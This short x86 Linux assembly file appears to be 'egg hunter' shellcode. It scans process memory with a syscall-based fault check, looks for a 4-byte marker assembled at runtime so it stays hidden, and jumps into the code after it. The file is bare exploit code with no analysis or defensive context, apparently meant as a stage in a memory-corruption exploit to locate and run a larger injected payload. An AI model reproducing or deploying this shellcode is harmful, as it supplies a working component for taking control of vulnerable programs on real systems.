; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    xor ebx, ebx
    mul ebx

CheckAddress:

    inc ebx

    xor eax, eax
    mov al, 12
    int 0x80

    cmp al, 0xf2
    jz CheckAddress

CheckBytes:

    mov edx, DWORD[ebx]
    mov esi, 0x72626373
    inc esi

    cmp edx, esi

    jnz CheckAddress

    add ebx, 4
    call ebx
